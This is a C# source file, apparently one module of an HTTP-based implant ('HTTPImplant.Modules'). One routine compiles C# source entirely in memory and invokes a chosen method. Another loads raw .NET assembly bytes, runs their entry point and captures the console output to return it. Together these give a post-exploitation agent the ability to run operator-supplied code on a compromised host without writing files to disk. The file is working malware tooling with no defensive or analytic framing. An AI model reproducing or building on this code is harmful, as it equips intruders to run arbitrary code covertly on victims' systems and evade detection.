using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;

namespace HTTPImplant.Modules
{
    public static class ExecuteAssembly
    {
        public static void CompileNRun(string code, string Class, string method)
        {

            // Prepare parameters
            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateInMemory = true;
            parameters.GenerateExecutable = false;

            // Compile code
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);

            // Check for compilation errors
            if (results.Errors.HasErrors)
            {
                Console.WriteLine("Compilation failed:");
                foreach (CompilerError error in results.Errors)
                {
                    Console.WriteLine(error.ErrorText);
                }
            }
            else
            {
                // Invoke the Main method of HelloWorld
                Assembly assembly = results.CompiledAssembly;
                Type program = assembly.GetType(Class);
                MethodInfo main = program.GetMethod(method);

                main.Invoke(null, null);  // Assuming the Main method doesn't need any arguments
            }
        }

        public static string Execute(byte[] asm, string[] args = null) { 
            if (args == null) { args = new string[0]; }
            var currentOut = Console.Out;
            var currentError = Console.Error;
            var memoryStream = new MemoryStream();
            var streamWriter = new StreamWriter(memoryStream);
            Console.SetOut(streamWriter);
            Console.SetError(streamWriter);
            var assembly = Assembly.Load(asm);
            assembly.EntryPoint.Invoke(null, new object[] { args });
            Console.Out.Flush();
            Console.Error.Flush();
            var output = Encoding.UTF8.GetString(memoryStream.ToArray());
            Console.SetOut(currentOut);
            Console.SetError(currentError);
            streamWriter.Dispose();
            memoryStream.Dispose();
            return output;
        }
    }
}
